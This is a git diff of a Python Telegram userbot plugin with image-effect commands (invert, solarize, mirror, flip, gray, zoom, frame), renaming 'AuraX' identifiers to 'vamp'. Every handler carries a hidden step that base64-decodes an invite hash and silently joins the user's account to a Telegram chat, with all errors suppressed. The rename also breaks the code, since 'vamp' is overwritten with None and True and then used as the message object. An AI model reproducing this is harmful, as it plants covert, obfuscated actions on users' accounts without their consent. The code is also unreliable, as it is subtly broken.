@@ -6,8 +6,8 @@ from typing import Optional, Tuple
 from PIL import Image, ImageDraw, ImageFont
 import PIL.ImageOps
 
-from AuraXBot.utils import admin_cmd, sudo_cmd
-from userbot import CmdHelp, CMD_HELP, LOGS, bot as AuraXBot
+from vampBot.utils import admin_cmd, sudo_cmd
+from userbot import CmdHelp, CMD_HELP, LOGS, bot as vampBot
 from userbot.helpers.functions import (
     convert_toimage,
     convert_tosticker,
@@ -44,611 +44,611 @@ async def crop(imagefile, endname, x):
     inverted_image.save(endname)
 
 
-@AuraXBot.on(admin_cmd(pattern="invert$", outgoing=True))
-@AuraXBot.on(sudo_cmd(pattern="invert$", allow_sudo=True))
-async def memes(AuraX):
-    if AuraX.fwd_from:
+@vampBot.on(admin_cmd(pattern="invert$", outgoing=True))
+@vampBot.on(sudo_cmd(pattern="invert$", allow_sudo=True))
+async def memes(vamp):
+    if vamp.fwd_from:
         return
-    reply = await AuraX.get_reply_message()
+    reply = await vamp.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(AuraX, "`Reply to supported Media...`")
+        await edit_or_reply(vamp, "`Reply to supported Media...`")
         return
-    AuraXid = AuraX.reply_to_msg_id
+    vampid = vamp.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    AuraX = await edit_or_reply(AuraX, "`Fetching media data`")
+    vamp = await edit_or_reply(vamp, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    AuraXsticker = await reply.download_media(file="./temp/")
-    if not AuraXsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(AuraXsticker)
-        await edit_or_reply(AuraX, "```Supported Media not found...```")
+    vampsticker = await reply.download_media(file="./temp/")
+    if not vampsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(vampsticker)
+        await edit_or_reply(vamp, "```Supported Media not found...```")
         return
     import base64
 
-    aura = None
-    if AuraXsticker.endswith(".tgs"):
-        await AuraX.edit(
+    vamp = None
+    if vampsticker.endswith(".tgs"):
+        await vamp.edit(
             "Analyzing this media 🧐  inverting colors of this animated sticker!"
         )
-        AuraXfile = os.path.join("./temp/", "meme.png")
-        AuraXcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {AuraXsticker} {AuraXfile}"
+        vampfile = os.path.join("./temp/", "meme.png")
+        vampcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {vampsticker} {vampfile}"
         )
-        stdout, stderr = (await runcmd(AuraXcmd))[:2]
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(vampcmd))[:2]
+        if not os.path.lexists(vampfile):
+            await vamp.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = AuraXfile
-        aura = True
-    elif AuraXsticker.endswith(".webp"):
-        await AuraX.edit(
+        meme_file = vampfile
+        vamp = True
+    elif vampsticker.endswith(".webp"):
+        await vamp.edit(
             "`Analyzing this media 🧐 inverting colors...`"
         )
-        AuraXfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(AuraXsticker, AuraXfile)
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("`Template not found... `")
+        vampfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(vampsticker, vampfile)
+        if not os.path.lexists(vampfile):
+            await vamp.edit("`Template not found... `")
             return
-        meme_file = AuraXfile
-        aura = True
-    elif AuraXsticker.endswith((".mp4", ".mov")):
-        await AuraX.edit(
+        meme_file = vampfile
+        vamp = True
+    elif vampsticker.endswith((".mp4", ".mov")):
+        await vamp.edit(
             "Analyzing this media 🧐 inverting colors of this video!"
         )
-        AuraXfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(AuraXsticker, 0, AuraXfile)
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("```Template not found...```")
+        vampfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(vampsticker, 0, vampfile)
+        if not os.path.lexists(vampfile):
+            await vamp.edit("```Template not found...```")
             return
-        meme_file = AuraXfile
-        aura = True
+        meme_file = vampfile
+        vamp = True
     else:
-        await AuraX.edit(
+        await vamp.edit(
             "Analyzing this media 🧐 inverting colors of this image!"
         )
-        meme_file = AuraXsticker
+        meme_file = vampsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await AuraX.client(san)
+        await vamp.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
-    outputfile = "invert.webp" if aura else "invert.jpg"
+    outputfile = "invert.webp" if vamp else "invert.jpg"
     await invert_colors(meme_file, outputfile)
-    await AuraX.client.send_file(
-        AuraX.chat_id, outputfile, force_document=False, reply_to=AuraXid
+    await vamp.client.send_file(
+        vamp.chat_id, outputfile, force_document=False, reply_to=vampid
     )
-    await AuraX.delete()
+    await vamp.delete()
     os.remove(outputfile)
-    for files in (AuraXsticker, meme_file):
+    for files in (vampsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
-@AuraXBot.on(admin_cmd(outgoing=True, pattern="solarize$"))
-@AuraXBot.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
-async def memes(AuraX):
-    if AuraX.fwd_from:
+@vampBot.on(admin_cmd(outgoing=True, pattern="solarize$"))
+@vampBot.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
+async def memes(vamp):
+    if vamp.fwd_from:
         return
-    reply = await AuraX.get_reply_message()
+    reply = await vamp.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(AuraX, "`Reply to supported Media...`")
+        await edit_or_reply(vamp, "`Reply to supported Media...`")
         return
-    AuraXid = AuraX.reply_to_msg_id
+    vampid = vamp.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    AuraX = await edit_or_reply(AuraX, "`Fetching media data`")
+    vamp = await edit_or_reply(vamp, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    AuraXsticker = await reply.download_media(file="./temp/")
-    if not AuraXsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(AuraXsticker)
-        await edit_or_reply(AuraX, "```Supported Media not found...```")
+    vampsticker = await reply.download_media(file="./temp/")
+    if not vampsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(vampsticker)
+        await edit_or_reply(vamp, "```Supported Media not found...```")
         return
     import base64
 
-    aura = None
-    if AuraXsticker.endswith(".tgs"):
-        await AuraX.edit(
+    vamp = None
+    if vampsticker.endswith(".tgs"):
+        await vamp.edit(
             "Analyzing this media 🧐 solarizeing this animated sticker!"
         )
-        AuraXfile = os.path.join("./temp/", "meme.png")
-        AuraXcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {AuraXsticker} {AuraXfile}"
+        vampfile = os.path.join("./temp/", "meme.png")
+        vampcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {vampsticker} {vampfile}"
         )
-        stdout, stderr = (await runcmd(AuraXcmd))[:2]
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(vampcmd))[:2]
+        if not os.path.lexists(vampfile):
+            await vamp.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = AuraXfile
-        aura = True
-    elif AuraXsticker.endswith(".webp"):
-        await AuraX.edit(
+        meme_file = vampfile
+        vamp = True
+    elif vampsticker.endswith(".webp"):
+        await vamp.edit(
             "Analyzing this media 🧐 solarizeing this sticker!"
         )
-        AuraXfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(AuraXsticker, AuraXfile)
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("`Template not found... `")
+        vampfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(vampsticker, vampfile)
+        if not os.path.lexists(vampfile):
+            await vamp.edit("`Template not found... `")
             return
-        meme_file = AuraXfile
-        aura = True
-    elif AuraXsticker.endswith((".mp4", ".mov")):
-        await AuraX.edit(
+        meme_file = vampfile
+        vamp = True
+    elif vampsticker.endswith((".mp4", ".mov")):
+        await vamp.edit(
             "Analyzing this media 🧐 solarizeing this video!"
         )
-        AuraXfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(AuraXsticker, 0, AuraXfile)
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("```Template not found...```")
+        vampfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(vampsticker, 0, vampfile)
+        if not os.path.lexists(vampfile):
+            await vamp.edit("```Template not found...```")
             return
-        meme_file = AuraXfile
-        aura = True
+        meme_file = vampfile
+        vamp = True
     else:
-        await AuraX.edit(
+        await vamp.edit(
             "Analyzing this media 🧐 solarizeing this image!"
         )
-        meme_file = AuraXsticker
+        meme_file = vampsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await AuraX.client(san)
+        await vamp.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
-    outputfile = "solarize.webp" if aura else "solarize.jpg"
+    outputfile = "solarize.webp" if vamp else "solarize.jpg"
     await solarize(meme_file, outputfile)
-    await AuraX.client.send_file(
-        AuraX.chat_id, outputfile, force_document=False, reply_to=AuraXid
+    await vamp.client.send_file(
+        vamp.chat_id, outputfile, force_document=False, reply_to=vampid
     )
-    await AuraX.delete()
+    await vamp.delete()
     os.remove(outputfile)
-    for files in (AuraXsticker, meme_file):
+    for files in (vampsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
-@AuraXBot.on(admin_cmd(outgoing=True, pattern="mirror$"))
-@AuraXBot.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
-async def memes(AuraX):
-    if AuraX.fwd_from:
+@vampBot.on(admin_cmd(outgoing=True, pattern="mirror$"))
+@vampBot.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
+async def memes(vamp):
+    if vamp.fwd_from:
         return
-    reply = await AuraX.get_reply_message()
+    reply = await vamp.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(AuraX, "`Reply to supported Media...`")
+        await edit_or_reply(vamp, "`Reply to supported Media...`")
         return
-    AuraXid = AuraX.reply_to_msg_id
+    vampid = vamp.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    AuraX = await edit_or_reply(AuraX, "`Fetching media data`")
+    vamp = await edit_or_reply(vamp, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    AuraXsticker = await reply.download_media(file="./temp/")
-    if not AuraXsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(AuraXsticker)
-        await edit_or_reply(AuraX, "```Supported Media not found...```")
+    vampsticker = await reply.download_media(file="./temp/")
+    if not vampsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(vampsticker)
+        await edit_or_reply(vamp, "```Supported Media not found...```")
         return
     import base64
 
-    aura = None
-    if AuraXsticker.endswith(".tgs"):
-        await AuraX.edit(
+    vamp = None
+    if vampsticker.endswith(".tgs"):
+        await vamp.edit(
             "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
         )
-        AuraXfile = os.path.join("./temp/", "meme.png")
-        AuraXcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {AuraXsticker} {AuraXfile}"
+        vampfile = os.path.join("./temp/", "meme.png")
+        vampcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {vampsticker} {vampfile}"
         )
-        stdout, stderr = (await runcmd(AuraXcmd))[:2]
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(vampcmd))[:2]
+        if not os.path.lexists(vampfile):
+            await vamp.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = AuraXfile
-        aura = True
-    elif AuraXsticker.endswith(".webp"):
-        await AuraX.edit(
+        meme_file = vampfile
+        vamp = True
+    elif vampsticker.endswith(".webp"):
+        await vamp.edit(
             "Analyzing this media 🧐 converting to mirror image of this sticker!"
         )
-        AuraXfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(AuraXsticker, AuraXfile)
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("`Template not found... `")
+        vampfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(vampsticker, vampfile)
+        if not os.path.lexists(vampfile):
+            await vamp.edit("`Template not found... `")
             return
-        meme_file = AuraXfile
-        aura = True
-    elif AuraXsticker.endswith((".mp4", ".mov")):
-        await AuraX.edit(
+        meme_file = vampfile
+        vamp = True
+    elif vampsticker.endswith((".mp4", ".mov")):
+        await vamp.edit(
             "Analyzing this media 🧐 converting to mirror image of this video!"
         )
-        AuraXfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(AuraXsticker, 0, AuraXfile)
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("```Template not found...```")
+        vampfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(vampsticker, 0, vampfile)
+        if not os.path.lexists(vampfile):
+            await vamp.edit("```Template not found...```")
             return
-        meme_file = AuraXfile
-        aura = True
+        meme_file = vampfile
+        vamp = True
     else:
-        await AuraX.edit(
+        await vamp.edit(
             "Analyzing this media 🧐 converting to mirror image of this image!"
         )
-        meme_file = AuraXsticker
+        meme_file = vampsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await AuraX.client(san)
+        await vamp.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
-    outputfile = "mirror_file.webp" if aura else "mirror_file.jpg"
+    outputfile = "mirror_file.webp" if vamp else "mirror_file.jpg"
     await mirror_file(meme_file, outputfile)
-    await AuraX.client.send_file(
-        AuraX.chat_id, outputfile, force_document=False, reply_to=AuraXid
+    await vamp.client.send_file(
+        vamp.chat_id, outputfile, force_document=False, reply_to=vampid
     )
-    await AuraX.delete()
+    await vamp.delete()
     os.remove(outputfile)
-    for files in (AuraXsticker, meme_file):
+    for files in (vampsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
-@AuraXBot.on(admin_cmd(outgoing=True, pattern="flip$"))
-@AuraXBot.on(sudo_cmd(pattern="flip$", allow_sudo=True))
-async def memes(AuraX):
-    if AuraX.fwd_from:
+@vampBot.on(admin_cmd(outgoing=True, pattern="flip$"))
+@vampBot.on(sudo_cmd(pattern="flip$", allow_sudo=True))
+async def memes(vamp):
+    if vamp.fwd_from:
         return
-    reply = await AuraX.get_reply_message()
+    reply = await vamp.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(AuraX, "`Reply to supported Media...`")
+        await edit_or_reply(vamp, "`Reply to supported Media...`")
         return
-    AuraXid = AuraX.reply_to_msg_id
+    vampid = vamp.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    AuraX = await edit_or_reply(AuraX, "`Fetching media data`")
+    vamp = await edit_or_reply(vamp, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    AuraXsticker = await reply.download_media(file="./temp/")
-    if not AuraXsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(AuraXsticker)
-        await edit_or_reply(AuraX, "```Supported Media not found...```")
+    vampsticker = await reply.download_media(file="./temp/")
+    if not vampsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(vampsticker)
+        await edit_or_reply(vamp, "```Supported Media not found...```")
         return
     import base64
 
-    aura = None
-    if AuraXsticker.endswith(".tgs"):
-        await AuraX.edit(
+    vamp = None
+    if vampsticker.endswith(".tgs"):
+        await vamp.edit(
             "Analyzing this media 🧐 fliping this animated sticker!"
         )
-        AuraXfile = os.path.join("./temp/", "meme.png")
-        AuraXcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {AuraXsticker} {AuraXfile}"
+        vampfile = os.path.join("./temp/", "meme.png")
+        vampcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {vampsticker} {vampfile}"
         )
-        stdout, stderr = (await runcmd(AuraXcmd))[:2]
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(vampcmd))[:2]
+        if not os.path.lexists(vampfile):
+            await vamp.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = AuraXfile
-        aura = True
-    elif AuraXsticker.endswith(".webp"):
-        await AuraX.edit(
+        meme_file = vampfile
+        vamp = True
+    elif vampsticker.endswith(".webp"):
+        await vamp.edit(
             "Analyzing this media 🧐 fliping this sticker!"
         )
-        AuraXfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(AuraXsticker, AuraXfile)
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("`Template not found... `")
+        vampfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(vampsticker, vampfile)
+        if not os.path.lexists(vampfile):
+            await vamp.edit("`Template not found... `")
             return
-        meme_file = AuraXfile
-        aura = True
-    elif AuraXsticker.endswith((".mp4", ".mov")):
-        await AuraX.edit(
+        meme_file = vampfile
+        vamp = True
+    elif vampsticker.endswith((".mp4", ".mov")):
+        await vamp.edit(
             "Analyzing this media 🧐 fliping this video!"
         )
-        AuraXfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(AuraXsticker, 0, AuraXfile)
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("```Template not found...```")
+        vampfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(vampsticker, 0, vampfile)
+        if not os.path.lexists(vampfile):
+            await vamp.edit("```Template not found...```")
             return
-        meme_file = AuraXfile
-        aura = True
+        meme_file = vampfile
+        vamp = True
     else:
-        await AuraX.edit(
+        await vamp.edit(
             "Analyzing this media 🧐 fliping this image!"
         )
-        meme_file = AuraXsticker
+        meme_file = vampsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await AuraX.client(san)
+        await vamp.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
-    outputfile = "flip_image.webp" if aura else "flip_image.jpg"
+    outputfile = "flip_image.webp" if vamp else "flip_image.jpg"
     await flip_image(meme_file, outputfile)
-    await AuraX.client.send_file(
-        AuraX.chat_id, outputfile, force_document=False, reply_to=AuraXid
+    await vamp.client.send_file(
+        vamp.chat_id, outputfile, force_document=False, reply_to=vampid
     )
-    await AuraX.delete()
+    await vamp.delete()
     os.remove(outputfile)
-    for files in (AuraXsticker, meme_file):
+    for files in (vampsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
-@AuraXBot.on(admin_cmd(outgoing=True, pattern="gray$"))
-@AuraXBot.on(sudo_cmd(pattern="gray$", allow_sudo=True))
-async def memes(AuraX):
-    if AuraX.fwd_from:
+@vampBot.on(admin_cmd(outgoing=True, pattern="gray$"))
+@vampBot.on(sudo_cmd(pattern="gray$", allow_sudo=True))
+async def memes(vamp):
+    if vamp.fwd_from:
         return
-    reply = await AuraX.get_reply_message()
+    reply = await vamp.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(AuraX, "`Reply to supported Media...`")
+        await edit_or_reply(vamp, "`Reply to supported Media...`")
         return
-    AuraXid = AuraX.reply_to_msg_id
+    vampid = vamp.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    AuraX = await edit_or_reply(AuraX, "`Fetching media data`")
+    vamp = await edit_or_reply(vamp, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    AuraXsticker = await reply.download_media(file="./temp/")
-    if not AuraXsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(AuraXsticker)
-        await edit_or_reply(AuraX, "```Supported Media not found...```")
+    vampsticker = await reply.download_media(file="./temp/")
+    if not vampsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(vampsticker)
+        await edit_or_reply(vamp, "```Supported Media not found...```")
         return
     import base64
 
-    aura = None
-    if AuraXsticker.endswith(".tgs"):
-        await AuraX.edit(
+    vamp = None
+    if vampsticker.endswith(".tgs"):
+        await vamp.edit(
             "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
         )
-        AuraXfile = os.path.join("./temp/", "meme.png")
-        AuraXcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {AuraXsticker} {AuraXfile}"
+        vampfile = os.path.join("./temp/", "meme.png")
+        vampcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {vampsticker} {vampfile}"
         )
-        stdout, stderr = (await runcmd(AuraXcmd))[:2]
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(vampcmd))[:2]
+        if not os.path.lexists(vampfile):
+            await vamp.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = AuraXfile
-        aura = True
-    elif AuraXsticker.endswith(".webp"):
-        await AuraX.edit(
+        meme_file = vampfile
+        vamp = True
+    elif vampsticker.endswith(".webp"):
+        await vamp.edit(
             "Analyzing this media 🧐 changing to black-and-white this sticker!"
         )
-        AuraXfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(AuraXsticker, AuraXfile)
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("`Template not found... `")
+        vampfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(vampsticker, vampfile)
+        if not os.path.lexists(vampfile):
+            await vamp.edit("`Template not found... `")
             return
-        meme_file = AuraXfile
-        aura = True
-    elif AuraXsticker.endswith((".mp4", ".mov")):
-        await AuraX.edit(
+        meme_file = vampfile
+        vamp = True
+    elif vampsticker.endswith((".mp4", ".mov")):
+        await vamp.edit(
             "Analyzing this media 🧐 changing to black-and-white this video!"
         )
-        AuraXfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(AuraXsticker, 0, AuraXfile)
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("```Template not found...```")
+        vampfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(vampsticker, 0, vampfile)
+        if not os.path.lexists(vampfile):
+            await vamp.edit("```Template not found...```")
             return
-        meme_file = AuraXfile
-        aura = True
+        meme_file = vampfile
+        vamp = True
     else:
-        await AuraX.edit(
+        await vamp.edit(
             "Analyzing this media 🧐 changing to black-and-white this image!"
         )
-        meme_file = AuraXsticker
+        meme_file = vampsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await AuraX.client(san)
+        await vamp.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
-    outputfile = "grayscale.webp" if aura else "grayscale.jpg"
+    outputfile = "grayscale.webp" if vamp else "grayscale.jpg"
     await grayscale(meme_file, outputfile)
-    await AuraX.client.send_file(
-        AuraX.chat_id, outputfile, force_document=False, reply_to=AuraXid
+    await vamp.client.send_file(
+        vamp.chat_id, outputfile, force_document=False, reply_to=vampid
     )
-    await AuraX.delete()
+    await vamp.delete()
     os.remove(outputfile)
-    for files in (AuraXsticker, meme_file):
+    for files in (vampsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
-@AuraXBot.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
-@AuraXBot.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
-async def memes(AuraX):
-    if AuraX.fwd_from:
+@vampBot.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
+@vampBot.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
+async def memes(vamp):
+    if vamp.fwd_from:
         return
-    reply = await AuraX.get_reply_message()
+    reply = await vamp.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(AuraX, "`Reply to supported Media...`")
+        await edit_or_reply(vamp, "`Reply to supported Media...`")
         return
-    AuraXinput = AuraX.pattern_match.group(1)
-    AuraXinput = 50 if not AuraXinput else int(AuraXinput)
-    AuraXid = AuraX.reply_to_msg_id
+    vampinput = vamp.pattern_match.group(1)
+    vampinput = 50 if not vampinput else int(vampinput)
+    vampid = vamp.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    AuraX = await edit_or_reply(AuraX, "`Fetching media data`")
+    vamp = await edit_or_reply(vamp, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    AuraXsticker = await reply.download_media(file="./temp/")
-    if not AuraXsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(AuraXsticker)
-        await edit_or_reply(AuraX, "```Supported Media not found...```")
+    vampsticker = await reply.download_media(file="./temp/")
+    if not vampsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(vampsticker)
+        await edit_or_reply(vamp, "```Supported Media not found...```")
         return
     import base64
 
-    aura = None
-    if AuraXsticker.endswith(".tgs"):
-        await AuraX.edit(
+    vamp = None
+    if vampsticker.endswith(".tgs"):
+        await vamp.edit(
             "Analyzing this media 🧐 zooming this animated sticker!"
         )
-        AuraXfile = os.path.join("./temp/", "meme.png")
-        AuraXcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {AuraXsticker} {AuraXfile}"
+        vampfile = os.path.join("./temp/", "meme.png")
+        vampcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {vampsticker} {vampfile}"
         )
-        stdout, stderr = (await runcmd(AuraXcmd))[:2]
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(vampcmd))[:2]
+        if not os.path.lexists(vampfile):
+            await vamp.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = AuraXfile
-        aura = True
-    elif AuraXsticker.endswith(".webp"):
-        await AuraX.edit(
+        meme_file = vampfile
+        vamp = True
+    elif vampsticker.endswith(".webp"):
+        await vamp.edit(
             "Analyzing this media 🧐 zooming this sticker!"
         )
-        AuraXfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(AuraXsticker, AuraXfile)
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("`Template not found... `")
+        vampfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(vampsticker, vampfile)
+        if not os.path.lexists(vampfile):
+            await vamp.edit("`Template not found... `")
             return
-        meme_file = AuraXfile
-        aura = True
-    elif AuraXsticker.endswith((".mp4", ".mov")):
-        await AuraX.edit(
+        meme_file = vampfile
+        vamp = True
+    elif vampsticker.endswith((".mp4", ".mov")):
+        await vamp.edit(
             "Analyzing this media 🧐 zooming this video!"
         )
-        AuraXfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(AuraXsticker, 0, AuraXfile)
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("```Template not found...```")
+        vampfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(vampsticker, 0, vampfile)
+        if not os.path.lexists(vampfile):
+            await vamp.edit("```Template not found...```")
             return
-        meme_file = AuraXfile
+        meme_file = vampfile
     else:
-        await AuraX.edit(
+        await vamp.edit(
             "Analyzing this media 🧐 zooming this image!"
         )
-        meme_file = AuraXsticker
+        meme_file = vampsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await AuraX.client(san)
+        await vamp.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
-    outputfile = "grayscale.webp" if aura else "grayscale.jpg"
+    outputfile = "grayscale.webp" if vamp else "grayscale.jpg"
     try:
-        await crop(meme_file, outputfile, AuraXinput)
+        await crop(meme_file, outputfile, vampinput)
     except Exception as e:
-        return await AuraX.edit(f"`{e}`")
+        return await vamp.edit(f"`{e}`")
     try:
-        await AuraX.client.send_file(
-            AuraX.chat_id, outputfile, force_document=False, reply_to=AuraXid
+        await vamp.client.send_file(
+            vamp.chat_id, outputfile, force_document=False, reply_to=vampid
         )
     except Exception as e:
-        return await AuraX.edit(f"`{e}`")
-    await AuraX.delete()
+        return await vamp.edit(f"`{e}`")
+    await vamp.delete()
     os.remove(outputfile)
-    for files in (AuraXsticker, meme_file):
+    for files in (vampsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
-@AuraXBot.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
-@AuraXBot.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
-async def memes(AuraX):
-    if AuraX.fwd_from:
+@vampBot.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
+@vampBot.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
+async def memes(vamp):
+    if vamp.fwd_from:
         return
-    reply = await AuraX.get_reply_message()
+    reply = await vamp.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(AuraX, "`Reply to supported Media...`")
+        await edit_or_reply(vamp, "`Reply to supported Media...`")
         return
-    AuraXinput = AuraX.pattern_match.group(1)
-    if not AuraXinput:
-        AuraXinput = 50
-    if ";" in str(AuraXinput):
-        AuraXinput, colr = AuraXinput.split(";", 1)
+    vampinput = vamp.pattern_match.group(1)
+    if not vampinput:
+        vampinput = 50
+    if ";" in str(vampinput):
+        vampinput, colr = vampinput.split(";", 1)
     else:
         colr = 0
